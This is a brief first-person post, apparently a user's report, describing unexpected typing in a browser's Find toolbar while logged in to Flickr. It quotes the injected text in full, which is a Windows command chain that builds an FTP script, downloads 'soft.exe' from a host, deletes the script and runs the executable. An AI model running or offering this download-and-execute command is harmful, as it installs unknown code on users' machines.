I was logged in to Flickr when the page started jumping around.  I noticed that the Find toolbar (ctrl+F) was open and text was been typed in to it which I was not typing.

This is a copy of what was typed in the toolbar:

c echo open IP 21 >> ik &echo user dsluser telnet >> ik &echo binary >> ik &echo get soft.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &soft.exe &exit
